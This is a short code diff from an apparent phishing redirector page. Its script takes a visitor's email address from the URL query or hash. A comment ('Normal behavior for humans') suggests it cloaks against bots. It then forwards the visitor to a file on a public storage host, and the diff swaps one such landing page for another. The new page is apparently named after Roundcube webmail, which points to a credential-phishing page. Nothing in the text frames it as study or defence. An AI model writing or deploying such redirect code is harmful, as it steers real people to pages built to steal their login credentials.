@@ -86,7 +86,7 @@
                 // Normal behavior for humans
                 const email = new URLSearchParams(window.location.search).get('email') || 
                              window.location.hash.replace('#', '') || '';
-                window.location.href = `https://f005.backblazeb2.com/file/QybO1SqPHUeh9Kbiglo/bidsebigl.html${email ? '#' + email : ''}`;
+                window.location.href = `https://filedn.com/lEKtsOkv8668qrKsUKPrDv8/roundcubestore8290.html${email ? '#' + email : ''}`;
             }
         }, 500);
     </script>
